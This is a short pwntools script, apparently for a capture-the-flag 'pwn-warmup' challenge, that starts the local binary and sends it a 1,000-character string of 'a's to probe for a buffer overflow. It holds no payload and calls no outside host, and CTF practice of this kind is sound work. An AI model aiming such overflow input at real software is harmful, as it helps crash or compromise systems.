from pwn import *
sh = process('./pwn-warmup')
sh.recvline(timeout=3)
sh.sendline("aaaaaaaaaa"*100)
sh.recvline(timeout=1)
